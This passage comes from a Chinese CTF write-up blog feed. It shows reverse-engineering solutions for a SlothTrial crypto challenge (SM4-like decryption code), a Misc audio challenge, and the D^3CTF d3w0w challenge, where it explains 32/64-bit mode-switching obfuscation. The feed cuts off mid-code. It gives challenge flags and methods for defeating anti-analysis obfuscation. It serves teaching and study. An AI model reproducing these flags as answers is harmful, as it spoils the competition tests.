class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">func_data</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ulTmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ucIndexList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ucSboxValueList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    uLong2four_uCh(input, ucIndexList);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    four_uCh2uLong(ucSboxValueList, &amp;ulTmp);</span><br><span class="line">    ulTmp = ulTmp ^ move(ulTmp, <span class="number">2</span>) ^ move(ulTmp, <span class="number">10</span>) ^ move(ulTmp, <span class="number">18</span>) ^ move(ulTmp, <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ulTmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密函数（与加密函数基本一致，只是秘钥使用的顺序不同，即把钥匙反着用就是解密）</span></span><br><span class="line"><span class="comment">//len:数据长度 key:密钥 input:输入的加密后数据 output:输出的解密后数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode_fun</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* key, <span class="keyword">unsigned</span> <span class="keyword">char</span>* input, <span class="keyword">unsigned</span> <span class="keyword">char</span>* output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ulKeyTmpList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储密钥的unsigned long数据</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ulKeyList[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;  <span class="comment">//用于密钥扩展算法与系统参数FK运算后的结果存储</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ulDataList[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">//用于存放加密数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*开始生成子秘钥*/</span></span><br><span class="line">    four_uCh2uLong(key, &amp;(ulKeyTmpList[<span class="number">0</span>]));</span><br><span class="line">    four_uCh2uLong(key + <span class="number">4</span>, &amp;(ulKeyTmpList[<span class="number">1</span>]));</span><br><span class="line">    four_uCh2uLong(key + <span class="number">8</span>, &amp;(ulKeyTmpList[<span class="number">2</span>]));</span><br><span class="line">    four_uCh2uLong(key + <span class="number">12</span>, &amp;(ulKeyTmpList[<span class="number">3</span>]));</span><br><span class="line"></span><br><span class="line">    ulKeyList[<span class="number">0</span>] = ulKeyTmpList[<span class="number">0</span>] ^ TBL_SYS_PARAMS[<span class="number">0</span>];</span><br><span class="line">    ulKeyList[<span class="number">1</span>] = ulKeyTmpList[<span class="number">1</span>] ^ TBL_SYS_PARAMS[<span class="number">1</span>];</span><br><span class="line">    ulKeyList[<span class="number">2</span>] = ulKeyTmpList[<span class="number">2</span>] ^ TBL_SYS_PARAMS[<span class="number">2</span>];</span><br><span class="line">    ulKeyList[<span class="number">3</span>] = ulKeyTmpList[<span class="number">3</span>] ^ TBL_SYS_PARAMS[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)             <span class="comment">//32次循环迭代运算</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//5-36为32个子秘钥</span></span><br><span class="line">        ulKeyList[i + <span class="number">4</span>] = ulKeyList[i] ^ func_key(ulKeyList[i + <span class="number">1</span>] ^ ulKeyList[i + <span class="number">2</span>] ^ ulKeyList[i + <span class="number">3</span>] ^ TBL_FIX_PARAMS[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*生成32轮32位长子秘钥结束*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len / <span class="number">16</span>; j++)  <span class="comment">//进行循环加密,并将加密后数据保存</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*开始处理解密数据*/</span></span><br><span class="line">        four_uCh2uLong(input + <span class="number">16</span> * j, &amp;(ulDataList[<span class="number">0</span>]));</span><br><span class="line">        four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">4</span>, &amp;(ulDataList[<span class="number">1</span>]));</span><br><span class="line">        four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">8</span>, &amp;(ulDataList[<span class="number">2</span>]));</span><br><span class="line">        four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">12</span>, &amp;(ulDataList[<span class="number">3</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解密</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ulDataList[i + <span class="number">4</span>] = ulDataList[i] ^ func_data(ulDataList[i + <span class="number">1</span>] ^ ulDataList[i + <span class="number">2</span>] ^ ulDataList[i + <span class="number">3</span>] ^ ulKeyList[<span class="number">35</span> - i]);<span class="comment">//与加密唯一不同的就是轮密钥的使用顺序</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*将解密后数据输出*/</span></span><br><span class="line">        uLong2four_uCh(ulDataList[<span class="number">35</span>], output + <span class="number">16</span> * j);</span><br><span class="line">        uLong2four_uCh(ulDataList[<span class="number">34</span>], output + <span class="number">16</span> * j + <span class="number">4</span>);</span><br><span class="line">        uLong2four_uCh(ulDataList[<span class="number">33</span>], output + <span class="number">16</span> * j + <span class="number">8</span>);</span><br><span class="line">        uLong2four_uCh(ulDataList[<span class="number">32</span>], output + <span class="number">16</span> * j + <span class="number">12</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> byte_40B000[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xF6</span>, <span class="number">0x66</span>, <span class="number">0xAE</span>, <span class="number">0xF4</span>, <span class="number">0xFE</span>, <span class="number">0x17</span>, <span class="number">0xAE</span>, <span class="number">0x18</span>, <span class="number">0xAE</span>, <span class="number">0x68</span>, <span class="number">0xC7</span>, <span class="number">0x81</span>, <span class="number">0x18</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x9B</span>, </span><br><span class="line">    <span class="number">0xF5</span>, <span class="number">0xEA</span>, <span class="number">0xE6</span>, <span class="number">0x22</span>, <span class="number">0x8F</span>, <span class="number">0x42</span>, <span class="number">0xCF</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>, <span class="number">0x15</span>, <span class="number">0x2A</span>, <span class="number">0xB7</span>, <span class="number">0xDC</span>, <span class="number">0xB3</span>, <span class="number">0x68</span>, <span class="number">0x4F</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> i, len;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> rslt[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">20</span>] = <span class="string">&quot;746573746f766572&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">512</span>; i++) &#123; <span class="comment">// 做了513次交换，其实就是做了一次交换，魔改密文</span></span><br><span class="line">        byte_40B000[<span class="number">23</span>] ^= byte_40B000[<span class="number">24</span>];</span><br><span class="line">        byte_40B000[<span class="number">24</span>] ^= byte_40B000[<span class="number">23</span>];</span><br><span class="line">        byte_40B000[<span class="number">23</span>] ^= byte_40B000[<span class="number">24</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    decode_fun(<span class="number">32</span>, key, byte_40B000, rslt);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, rslt[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022SlothTrial/image-20220511094204414.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="TapIt"><a href="#TapIt" class="headerlink" title="TapIt"></a>TapIt</h2><p>附件里有一个<code>Mikuuuuuu.mp4</code>，给了一个演唱工具，明显是让你用这个演唱工具唱出跟mp4一样的旋律。</p><p>flag格式给了一个正则<code>r&#39;[0-9a-v]&#123;30&#125;&#39;</code>，意思是长度为30，字符为0-9或者a-v的某一个字符。</p><p>演唱工具魔改自<a href="https://github.com/HFIProgramming/mikutap">HFIProgramming&#x2F;mikutap: A Mainland China Friendly and independent version extracted from https://aidn.jp/mikutap</a>，逆一下<code>mikutap.js</code>（不要问为什么逆这个，其他看起来就是导入的js，只有这个是用户自己写的）。</p><p>画面呈现存放在数组m中：</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511100126758.png"></p><p>声音则是存在<code>data/main/main.json</code>中，通过base64解码得到音频。</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511101820278.png"></p><p>而通过测试或者逆向代码能发现，0-9a-v可以呈现32种不同的声音，16种不同的画面类型，也就是说有两个字符的画面是一种类型的，但是声音呈现是唯一的。那么就可以通过画面+声音筛选拿到flag：<strong>l0vemikufor3verdoul1ke7hi5misc</strong>。</p><p>值得一提的是，原工具中每一次打开时同一个字符对应的画面类型是不同的，但是在同一次打开中同一个字符对应的画面类型是相同的（shuffle操作只在初始化的时候有做），但是本题工具中为了方便解题把这句shuffle给删掉了，所以无论多少次打开都是一样的。</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511102819522.png"></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
            <tag> 华师CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2022D^3CTF</title>
      <link href="p/wpFor-2022D3CTF/"/>
      <url>p/wpFor-2022D3CTF/</url>
      
        <content type="html"><![CDATA[<p> 上周末因为各种原因没怎么打hhh，唯一在有空嗑的题都是赛后一个小时内解出来的🤣（没看wp，瞄了一眼解题人数好像是简单题xd。</p><p>薛定谔的音游题复现，咕——</p><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="d3w0w"><a href="#d3w0w" class="headerlink" title="d3w0w"></a>d3w0w</h2><p>这是一个32位切64位运行的混淆，毕竟64位操作系统兼容32位，但是IDA（包括大部分反汇编器）只能运行单一模式，32或者64（</p><p><img src="/p/wpFor-2022D3CTF/image-20220309084828970.png"></p><p>主函数看到逻辑很简单（原题目无符号，重命名了一下），主要分析check1和check2两个函数，要让两个函数都返回0才会输出win。</p><p><img src="/p/wpFor-2022D3CTF/image-20220309084449051.png"></p><p>check1逻辑很明显啦~ 改了一下a2的数据类型让它更好看一点，光标点到数字上按<code>r</code>可以让数字转成字符串（比如<code>1952658276</code> -&gt; <code>&#39;tc3d&#39;</code>）。</p><p>v5是x，v4是y，可以看到这是个用<code>a1</code>（即<code>flag</code>）初始化<code>a2</code>（即<code>map</code>）的过程，开头检查了flag的开头和结尾分别是<code>d3ctf&#123;2</code>和<code>&#125;</code>，中间的数据只能是<code>1234</code>四个字符中的任何一个。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">check1</span><span class="params">(<span class="keyword">int</span> a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+0h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">6</span>;</span><br><span class="line">  if ( *(_DWORD *)a1 != &#x27;tc3d&#x27; )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  if ( *(_WORD *)(a1 + 4) != &#x27;&#123;f&#x27; )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">6</span>) != <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(v3 + a1) != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( *(_BYTE *)(v3 + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        a2[<span class="number">6</span> * v5 + v4] |= <span class="number">8u</span>;</span><br><span class="line">        a2[<span class="number">6</span> * --v5 + v4] |= <span class="number">2u</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        a2[<span class="number">6</span> * v5 + v4] |= <span class="number">2u</span>;</span><br><span class="line">        a2[<span class="number">6</span> * ++v5 + v4] |= <span class="number">8u</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        a2[<span class="number">6</span> * v5 + v4] |= <span class="number">4u</span>;</span><br><span class="line">        a2[<span class="number">6</span> * v5 - <span class="number">1</span> + v4--] |= <span class="number">1u</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        a2[<span class="number">6</span> * v5 + v4] |= <span class="number">1u</span>;</span><br><span class="line">        a2[<span class="number">6</span> * v5 + <span class="number">1</span> + v4++] |= <span class="number">4u</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">        <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> || v4 &lt; <span class="number">0</span> || v5 &gt; <span class="number">5</span> || v4 &gt; <span class="number">5</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>switch</code>这里是从开头的<code>2</code>开始对map按照一定的规则进行初始化，并对x和y进行加减移动。</p><p>简单地画了一下这里的规则，更直观一点（1&#x2F;2&#x2F;4&#x2F;8分别表示二进制的四个位，所以每个格子的数字用二进制来表示，x表任意值，即x表示0或1）：</p><p><img src="/p/wpFor-2022D3CTF/image-20220309091557313.png"></p><p>check2看起来正常实际上并不太正常，看到一堆寄存器赋值和<code>arpl</code></p><p><img src="/p/wpFor-2022D3CTF/image-20220309091208129.png"></p><p>还有最开始那个跳转到<code>CS</code>是0x33的<code>retf</code></p><p>刚开始还以为<code>call $+5</code>是花指令，结果想了半天没搞明白为啥是retf到0x33（</p><p><del>原谅一下没接触过这种混淆的菜鸡xd</del></p><p><img src="/p/wpFor-2022D3CTF/image-20220309091939287.png"></p><p>用<code>arpl</code>为关键字之一，摸到了<a href="https://reverseengineering.stackexchange.com/questions/1531/what-is-overlapping-instructions-obfuscation">binary analysis - What is “overlapping instructions” obfuscation? - Reverse Engineering Stack Exchange</a></p><p><img src="/p/wpFor-2022D3CTF/image-20220309091843355.png"></p><p>才知道这是一种典型的混淆，64位模式的<code>CS</code>正是<code>0x33</code>。</p><p>在<a href="https://zhuanlan.kanxue.com/article-12485.htm">使用32位64位交叉编码混淆来打败静态和动态分析工具</a>这里，更清楚地说明了这种混淆技术。</p><p>知道这是混淆以后，开始摸索这种混淆的破解方式，可以把标志位改了的这种瞎操作然后直接用ida64分析，效果还不错。</p><p><img src="/p/wpFor-2022D3CTF/image-20220309092957987.png"></p><p><img src="/p/wpFor-2022D3CTF/Untitled.png"></p><p>也可以把其中的64位的函数dump下来直接用IDA64打开用64-mode分析。</p><p>（因为这个函数的所有操作都没有调用其他函数，而唯二调用的两个函数是用来切换32&#x2F;64模式的，所以完全可以这么干2333 不然就得把其他函数也dump下来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x401220</span></span><br><span class="line">end = <span class="number">0x40203E</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./64bit.dmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    memory = []</span><br><span class="line">    <span class="keyword">while</span> start &lt;= end:</span><br><span class="line">        memory.append(get_wide_byte(start))</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">    f.write(<span class="built_in">bytes</span>(memory))</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022D3CTF/image-20220309094407240.png"></p><p>做出来以后无意中看到了一篇对口指南：<a href="https://www.anquanke.com/post/id/171111">CTF中32位程序调用64位代码的逆向方法 - 安全客，安全资讯平台</a></p><p>这里用的是第二种方法，在最开头按一下<code>p</code>生成函数。</p><p><img src="/p/wpFor-2022D3CTF/image-20220309094528689.png"></p><p><img src="/p/wpFor-2022D3CTF/image-20220309094557871.png"></p><p>但是反编译会看到一些内存错误（毕竟没dump那两个切换函数），需要稍微修一下</p><p><img src="/p/wpFor-2022D3CTF/image-20220309095739260.png"></p><p>看汇编可以看到这三句是没用的，第一句和第三句是用来保存栈原来的值的，中间那句call是调用切换函数，所以完全可以全部nop掉。</p><p><img src="/p/wpFor-2022D3CTF/image-20220309095842149.png"></p><p>另外一个调用看流程图可以知道最后全部跳到了同一个块里，这句调用切换函数的call也是没用的，nop掉。</p><p><img src="/p/wpFor-2022D3CTF/image-20220309100114485.png"></p><p>然后把原来的伪代码窗口关掉重新分析一下（顺便重命名），注释里面写了一些各部分的意思</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> sp1_x; <span class="comment">// [rsp+0h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> sp2_x; <span class="comment">// [rsp+0h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> check_x; <span class="comment">// [rsp+0h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> sp1_y; <span class="comment">// [rsp+4h] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">int</span> sp2_y; <span class="comment">// [rsp+4h] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">int</span> check_y; <span class="comment">// [rsp+4h] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-9Ch]</span></span><br><span class="line">  <span class="keyword">int</span> last_x; <span class="comment">// [rsp+10h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> last_y; <span class="comment">// [rsp+14h] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+18h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> l; <span class="comment">// [rsp+1Ch] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// [rsp+20h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [rsp+24h] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [rsp+28h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// [rsp+2Ch] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// [rsp+30h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [rsp+34h] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> sp1[<span class="number">4</span>]; <span class="comment">// [rsp+38h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> sp2[<span class="number">10</span>]; <span class="comment">// [rsp+48h] [rbp-60h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+70h] [rbp-38h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+78h] [rbp-30h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+80h] [rbp-28h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+88h] [rbp-20h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+90h] [rbp-18h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+98h] [rbp-10h]</span></span><br><span class="line">  _DWORD *<span class="built_in">map</span>; <span class="comment">// [rsp+B0h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  sp1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sp1[<span class="number">1</span>] = <span class="number">14</span>;</span><br><span class="line">  sp1[<span class="number">2</span>] = <span class="number">20</span>;</span><br><span class="line">  sp2[<span class="number">0</span>] = <span class="number">4</span>;</span><br><span class="line">  sp2[<span class="number">1</span>] = <span class="number">13</span>;</span><br><span class="line">  sp2[<span class="number">2</span>] = <span class="number">15</span>;</span><br><span class="line">  sp2[<span class="number">3</span>] = <span class="number">21</span>;</span><br><span class="line">  sp2[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  sp2[<span class="number">5</span>] = <span class="number">31</span>;</span><br><span class="line">  sp2[<span class="number">6</span>] = <span class="number">32</span>;</span><br><span class="line">  sp2[<span class="number">7</span>] = <span class="number">41</span>;</span><br><span class="line">  sp2[<span class="number">8</span>] = <span class="number">45</span>;</span><br><span class="line">  sp2[<span class="number">9</span>] = <span class="number">53</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//第一个循环：检查所有格子</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span 